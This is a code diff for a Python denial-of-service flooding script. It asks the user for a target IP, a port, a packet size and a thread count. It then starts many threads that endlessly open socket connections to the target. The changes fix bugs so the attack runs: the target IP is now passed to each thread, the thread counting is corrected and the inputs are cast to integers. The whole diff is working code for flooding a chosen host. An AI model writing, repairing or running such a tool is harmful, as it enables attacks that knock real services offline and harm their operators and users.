@@ -27,8 +27,8 @@ def credintials():# :>
 
     
 #main static dos function       
-def static_port_dos_main(port):
-    global PACKET_SIZE, IP
+def static_port_dos_main(IP , port):
+    global PACKET_SIZE
     while True:
         sc = socket.socket()
         try:
@@ -45,18 +45,20 @@ def static_port_dos_main(port):
                 break    
 #Just creates threads for static dos
 def static_port_dos(port):
-    global N_OF_THREADS    
+    global N_OF_THREADS,IP    
     threads_pool = []    
     for i in range(N_OF_THREADS):
-        threads_pool.append(threading.Thread(target = static_port_dos_main, args=(port)))
+        threads_pool.append(threading.Thread(target = static_port_dos_main, args=(IP,port)))
         
     for i in range(N_OF_THREADS):
         try:
             threads_pool[i].start()
         except:
+            threads_pool.remove(i)
             pass
-    print(len(threads),'threads active')    
-    for i in range(N_OF_THREADS):
+    print(len(threads_pool),'threads active')
+    
+    for i in range(len(threads_pool)):
         try:
             threads_pool[i].join()
         except:
@@ -69,8 +71,8 @@ def main():
     
     PR = int(input("Port : "))
     IP = input("IP : ")
-    ps = input("Packet size(0 if default): ")
-    no = input("Number of threads(0 if default): ")
+    ps = int(input("Packet size(0 if default): "))
+    no = int(input("Number of threads(0 if default): "))
     print('\n')
     if ps > 0:
         PACKET_SIZE = ps
